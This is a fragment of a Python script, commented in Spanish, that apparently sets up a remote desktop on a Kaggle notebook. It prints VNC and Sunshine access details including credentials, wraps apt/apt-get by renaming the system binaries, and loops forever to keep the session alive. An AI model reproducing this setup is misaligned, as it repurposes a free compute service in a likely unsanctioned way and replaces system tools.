print("[OPCION 2] CLIENTE NATIVO VNC (CONEXIÓN BINARIA TCP - REALVNC / AVNC):", flush=True)
print("------------------------------------------------------------------------------", flush=True)
print(f"  • RealVNC Viewer:          {host_part}::{port_part}")
print(f"  • AVNC / bVNC Host:        {host_part}")
print(f"  • AVNC / bVNC Puerto:      {port_part}")
print(f"  • Contraseña VNC:          {VNC_PASSWORD}")
print("-" * 78, flush=True)

print("[OPCION 3] MOONLIGHT + SUNSHINE (GAMING 60 FPS / GPU TESLA DIRECTA):", flush=True)
print("------------------------------------------------------------------------------", flush=True)
print(f"  • Servidor Sunshine:       [OK] Activo en segundo plano (Puerto 47989/47990)")
print(f"  • Credenciales Web:        admin / {VNC_PASSWORD}")
print("=" * 78, flush=True)

print("[STORAGE] Persistencia y Almacenamiento Activos:", flush=True)
print("  • Unidad de 5TB Google Drive (Cloud_PC) montada en /root/gdrive.", flush=True)
print("  • Suite Ofimática LibreOffice (Writer, Calc, Impress) instalada.", flush=True)
print("  • Comunicaciones y Navegación: Google Chrome, Discord, Telegram listos.", flush=True)
print("  • Tienda de Software y Juegos 1-Clic en el Escritorio.", flush=True)
print("  • Relación de aspecto 16:9 nativa Full HD perfecta.", flush=True)
print("=" * 78 + "\n", flush=True)

# ==============================================================================
# Instalador Inteligente (Secuestrador de APT)
# ==============================================================================
apt_wrapper = """#!/bin/bash
if [[ " $@ " =~ " install " ]] && command -v zenity &> /dev/null && [ -n "$DISPLAY" ] && [ "$DEBIAN_FRONTEND" != "noninteractive" ]; then
    zenity --question --title="🛡️ Instalador Inteligente Ubuntu Cloud" \\
           --text="⚠️ Estás instalando software en la <b>Raíz de Kaggle</b> (límite 20GB).\\n\\nEste programa NO se guardará en Google Drive, pero sí sus configuraciones.\\n\\n¿Continuar con la instalación?" \\
           --width=450
    if [ $? -ne 0 ]; then
        echo "❌ Instalación cancelada para proteger los 20GB."
        exit 1
    fi
fi
if [ "$(basename "$0")" = "apt" ]; then
    /usr/bin/apt.real "$@"
else
    /usr/bin/apt-get.real "$@"
fi
"""
if not Path("/usr/bin/apt.real").exists():
    subprocess.run("mv /usr/bin/apt /usr/bin/apt.real && mv /usr/bin/apt-get /usr/bin/apt-get.real", shell=True)
    Path("/usr/bin/apt").write_text(apt_wrapper)
    Path("/usr/bin/apt-get").write_text(apt_wrapper)
    subprocess.run("chmod +x /usr/bin/apt /usr/bin/apt-get", shell=True)

# Mantener viva la celda con monitoreo de salud, auto-guardado y reporte de telemetría en tiempo real
try:
    minutos = 0
    while True:
        time.sleep(30)
        minutos += 0.5
        
        # Watchdog: Monitoreo activo de procesos
        xvfb_alive = Path("/tmp/.X11-unix/X1").exists()
        vnc_alive = wait_for_port(5900, timeout=1)
        novnc_alive = wait_for_port(6080, timeout=1)
        drive_alive = Path("/root/gdrive").exists()
        
        if not xvfb_alive:
            print(f"\n🔴 [{time.strftime('%H:%M:%S')}] [ALERTA DE PROCESO] Servidor X11 Display :1 no responde.", flush=True)
        if not vnc_alive:
            print(f"\n🔴 [{time.strftime('%H:%M:%S')}] [ALERTA DE PROCESO] Servidor VNC (5900) no responde.", flush=True)
        if not novnc_alive:
            print(f"\n🔴 [{time.strftime('%H:%M:%S')}] [ALERTA DE PROCESO] Servidor noVNC (6080) no responde.", flush=True)

        # Storage Sentinel: Guardián de disco que auto-purga residuos en /kaggle/working cada 30 segundos
        try:
            kw_dir = Path("/kaggle/working")
            if kw_dir.exists():
                for tmp_f in kw_dir.glob("*.tmp"):
                    tmp_f.unlink(missing_ok=True)
                for stray_deb in kw_dir.glob("*.deb"):
                    stray_deb.unlink(missing_ok=True)
        except Exception:
            pass
            
        if minutos % 5 == 0:
            auto_save_user_state()
            try:
                ram_str = subprocess.check_output("free -h | grep Mem: | awk '{print $3 \"/\" $2}'", shell=True, text=True).strip()
                disk_str = subprocess.check_output("df -h / 2>/dev/null | tail -1 | awk '{print $4 \" libres\"}'", shell=True, text=True).strip()
                gpu_info = ""
                try:
                    gpu_lines = subprocess.check_output("nvidia-smi --query-gpu=index,utilization.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null", shell=True, text=True).strip().splitlines()
                    if gpu_lines:
                        gpu_parts = []
                        for g in gpu_lines:
                            parts = [x.strip() for x in g.split(",")]
                            if len(parts) >= 4:
                                idx, util, mem_u, mem_t = parts[0], parts[1], parts[2], parts[3]
                                gpu_parts.append(f"T4-{idx}: {util}% ({mem_u}/{mem_t}MB)")
                        if gpu_parts:
                            gpu_info = " | 🎮 " + ", ".join(gpu_parts)
                except Exception:
                    pass
                print(f"\n📊 [{time.strftime('%H:%M:%S')}] Telemetría ({int(minutos)} min activo) | 🟢 RAM: {ram_str} | 💾 Disco: {disk_str}{gpu_info} | ☁️ Drive: {'Conectado' if drive_alive else 'Desconectado'} | Estado Guardado ✅", flush=True)
            except Exception:
                print(f"\n📊 [{time.strftime('%H:%M:%S')}] Telemetría ({int(minutos)} min activo) | Estado Guardado en Drive ✅", flush=True)
        else:
            print(".", end="", flush=True)
except KeyboardInterrupt:
    print("\n🛑 Guardando estado final antes de salir...", flush=True)
    auto_save_user_state()
    print("✅ Estado guardado. Servidor detenido.", flush=True)
